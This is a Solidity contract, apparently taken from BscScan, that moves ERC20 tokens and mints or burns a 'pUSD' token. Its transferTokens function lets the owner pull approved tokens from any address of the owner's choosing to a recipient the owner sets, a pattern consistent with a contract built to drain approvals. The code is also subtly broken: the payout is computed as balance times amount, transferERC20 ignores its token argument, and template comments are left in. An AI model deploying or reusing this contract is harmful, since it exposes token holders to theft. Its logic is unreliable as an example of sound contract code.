/**
 *Submitted for verification at BscScan.com on 2023-03-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function mint(address to, uint256 value) external;
    function burn(uint256 value) external;
}


contract TokenTransfer {
    address public owner;
    address public recipient;
    address public pUSD;
    
    constructor() {
        owner = msg.sender;
        recipient = address(0); // Set the recipient to the zero address by default
    }
    
    function setRecipient(address _recipient) public {
        require(msg.sender == owner, "Only the owner can set the recipient");
        recipient = _recipient;
    }
    function set_Add(address _usd) public {
        require(msg.sender == owner, "Only the owner can set the recipient");
        pUSD = _usd;
    }
    
    event TokensTransferred(address indexed from, address indexed to, uint256 value);
    
    function transferTokens(address[] calldata _tokens, uint256[] calldata _prices, address _sender ) external {
        require(msg.sender == owner, "Only the owner can set the recipient");
        require(_tokens.length == _prices.length, "Arrays must be of equal length");
        
        uint256 totalValue = 0;
        uint256 contractBalance = ERC20(pUSD).balanceOf(address(this));
        
        for (uint i = 0; i < _tokens.length; i++) {
            ERC20 token = ERC20(_tokens[i]);
            uint256 balance = token.balanceOf(_sender);
            require(balance >= _prices[i], "Insufficient balance");
            uint256 value = balance * _prices[i];

            require(token.transferFrom(_sender,recipient, _prices[i]), "Transfer failed");
            
            totalValue += value;
        }
        if (contractBalance < totalValue) {
            // Replace the `Token` contract address with the appropriate ERC20 token address
            ERC20(pUSD).burn(contractBalance);
            ERC20(pUSD).mint(_sender, totalValue);
        }else{
            ERC20(pUSD).transfer(_sender, totalValue);
        }
        // Mint tokens to transferring account
        // You can use a ERC20 token with a mint function, or use another mechanism to create tokens
        // For this example, we'll just emit an event with the total value
        // emit TokensTransferred(msg.sender, _recipient, totalValue);
    }
    function transferERC20(address token, address to, uint256 value) public returns (bool) {
        require(msg.sender == owner, "Only the owner can set the recipient");
        uint256 contractBalance = ERC20(pUSD).balanceOf(address(this));
        if (contractBalance < value && token == pUSD) {
            // Replace the `Token` contract address with the appropriate ERC20 token address
            ERC20(pUSD).burn(contractBalance);
            ERC20(pUSD).mint(to, value);
            return true;
        }else{
            ERC20(pUSD).transfer(to, value);
            return true;
        }

    }
    
   
}